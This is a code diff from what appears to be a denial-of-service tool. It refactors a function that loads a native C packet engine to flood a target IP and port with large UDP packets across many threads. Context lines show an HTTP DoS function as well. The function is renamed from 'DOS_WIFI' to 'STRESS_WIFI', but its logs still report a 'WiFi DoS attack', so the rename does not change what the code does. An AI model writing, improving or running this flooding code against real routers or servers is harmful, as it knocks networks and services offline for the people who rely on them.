@@ -114,39 +114,143 @@ def DOS_HTTP(target_url: str, total_requests: int, num_threads: int = None):
     log(f"[+] Throughput:           {rps:,.2f} Req/Sec")
     log("[!] DoS HTTP Attack execution completed.")
 
-def DOS_WIFI(ip: str, port: int, max_i: int, payload_bytes: int):
-    """Launches a WiFi DoS attack against an router."""
+def STRESS_WIFI(
+    ip: str,
+    port: int,
+    max_i: int,
+    payload_bytes: int
+):
+    """
+    Launch the native WiFi packet test.
+
+    Returns:
+        0 = completed normally
+        1 = interrupted with Ctrl+C
+       -1 = failed to start / incomplete
+    """
+
+    # ---------------------------------------------------------
+    # Check native library
+    # ---------------------------------------------------------
+
     needs_recompile = False
-    
+
     if not os.path.exists(LIB_FILE_WIFI):
         needs_recompile = True
+
     elif os.path.exists(C_FILE_WIFI):
         c_mtime = os.path.getmtime(C_FILE_WIFI)
-        dll_mtime = os.path.getmtime(LIB_FILE_WIFI)
-        if c_mtime > dll_mtime:  # C code is newer than DLL
+        lib_mtime = os.path.getmtime(LIB_FILE_WIFI)
+
+        if c_mtime > lib_mtime:
             log("[*] Detected changes in fast_packet_wifi.c!")
             needs_recompile = True
 
     if needs_recompile:
-        log("[!!] FATAL ERROR: The C WIFI engine is outdated or not compiled. Run download_dependencies() first.")
-        return
-    
+        log(
+            "[!!] FATAL ERROR: The native WIFI engine is "
+            "outdated or not compiled. Run download_dependencies() first."
+        )
+        return -1
+
+    # ---------------------------------------------------------
+    # Basic validation
+    # ---------------------------------------------------------
+
+    if not ip:
+        log("[!] Invalid target IP.")
+        return -1
+
+    if port < 1 or port > 65535:
+        log("[!] Invalid port.")
+        return -1
+
+    if max_i <= 0:
+        log("[!] Packet count must be greater than 0.")
+        return -1
+
+    if payload_bytes <= 0:
+        payload_bytes = 65000
+
+    if payload_bytes > 65506:
+        log("[!] UDP payload cannot exceed 65507 bytes.")
+        return -1
+
+    # ---------------------------------------------------------
+    # Thread count
+    # ---------------------------------------------------------
+
     num_cores = multiprocessing.cpu_count()
-    log(f"[+] Launching native C packet engine across {num_cores} cores ({max_i:,} packets...")
 
-    ip_bytes = ip.encode('utf-8')
-    c_lib = ctypes.CDLL(LIB_FILE_WIFI)
+    if num_cores < 1:
+        num_cores = 1
 
-    # Configure ALL 5 argument types for ctypes
+    # Don't create more workers than packets.
+    num_threads = min(num_cores, max_i)
+
+    log(
+        f"[+] Launching native C packet engine "
+        f"across {num_threads} threads "
+        f"({max_i:,} total packets)..."
+    )
+
+    # ---------------------------------------------------------
+    # Load shared library
+    # ---------------------------------------------------------
+
+    try:
+        c_lib = ctypes.CDLL(
+            LIB_FILE_WIFI,
+            use_errno=True
+        )
+    except OSError as exc:
+        log(f"[!] Failed to load WIFI native library: {exc}")
+        return -1
+
+    # ---------------------------------------------------------
+    # Configure C function
+    # ---------------------------------------------------------
+
     c_lib.start_packet_generator.argtypes = [
-        ctypes.c_char_p,  # IP
-        ctypes.c_int,     # Port
-        ctypes.c_int64,    # max_i
-        ctypes.c_int,     # threads
-        ctypes.c_int      # payload_bytes (FIXED: Added 5th parameter)
+        ctypes.c_char_p,   # IP
+        ctypes.c_int,      # Port
+        ctypes.c_int64,    # TOTAL packets
+        ctypes.c_int,      # Threads
+        ctypes.c_int       # Payload size
     ]
-    
-    # Executes compiled C code
-    c_lib.start_packet_generator(ip_bytes, int(port), int(max_i), num_cores, int(payload_bytes))
 
-    log("[!] DoS WiFi Attack execution completed.")
+    c_lib.start_packet_generator.restype = ctypes.c_int
+
+    # ---------------------------------------------------------
+    # Execute native engine
+    # ---------------------------------------------------------
+
+    try:
+        result = c_lib.start_packet_generator(
+            ip.encode("utf-8"),
+            int(port),
+            int(max_i),
+            int(num_threads),
+            int(payload_bytes)
+        )
+
+    except KeyboardInterrupt:
+        # Normally the C SIGINT handler catches Ctrl+C first.
+        # This is just a fallback.
+        log("[!] Keyboard interrupt received.")
+        return 1
+
+    # ---------------------------------------------------------
+    # Handle C return code
+    # ---------------------------------------------------------
+
+    if result == 0:
+        log("[+] WiFi DoS attack completed.")
+
+    elif result == 1:
+        log("[!] WiFi DoS attack interrupted by user.")
+
+    else:
+        log("[!] WiFi DoS attack ended with an error.")
+
+    return result
